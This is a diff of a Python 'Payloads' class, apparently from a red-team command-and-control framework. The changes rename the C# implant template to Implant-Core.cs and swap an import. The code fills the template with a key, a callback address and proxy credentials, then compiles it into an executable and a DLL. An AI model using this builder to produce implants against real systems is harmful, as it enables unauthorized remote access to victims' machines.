@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
-from Core import *
 from Config import *
 from Colours import *
+from Utils import *
 import StringIO, gzip, io, base64, subprocess, os, hashlib, re
 
 class Payloads(object):
@@ -171,7 +171,7 @@ class Payloads(object):
 
   def CreateDlls(self, name=""):
     # Create Sharp DLL
-    with open("%sSharp.cs" % FilesDirectory, 'rb') as f:
+    with open("%sImplant-Core.cs" % FilesDirectory, 'rb') as f:
       content = f.read()
     cs = content.replace("#REPLACEKEY#",self.Key )
     cs1 = cs.replace("#REPLACEBASEURL#",(self.HostnameIP+":"+self.Serverport))
@@ -184,16 +184,16 @@ class Payloads(object):
     cs8 = cs7.replace("#REPLACEPROXYUSER#",self.Proxyuser)
     cs9 = cs8.replace("#REPLACEPROXYPASSWORD#",self.Proxypass)
     
-    self.QuickstartLog( "C# Payload written to: %s%sSharp.cs" % (self.BaseDirectory,name) )
-    filename = "%s%sSharp.cs" % (self.BaseDirectory,name)
+    self.QuickstartLog( "C# Payload written to: %s%sImplant-Core.cs" % (self.BaseDirectory,name) )
+    filename = "%s%sImplant-Core.cs" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
     output_file.write(cs9)
     output_file.close()
     if os.name == 'nt':
-        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe %s%sSharp.cs -o %s%sSharp.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
+        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe %s%sImplant-Core.cs -o %s%sSharp.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
     else:
-        compile = "mono-csc %s%sSharp.cs -out:%s%sSharp.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
-        compileexe = "mono-csc %s%sSharp.cs -out:%s%sSharp.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
+        compile = "mono-csc %s%sImplant-Core.cs -out:%s%sSharp.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
+        compileexe = "mono-csc %s%sImplant-Core.cs -out:%s%sSharp.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
     subprocess.check_output(compile, shell=True)
     self.QuickstartLog( "C# DLL written to: %s%sSharp.dll" % (self.BaseDirectory,name) )
     subprocess.check_output(compileexe, shell=True)
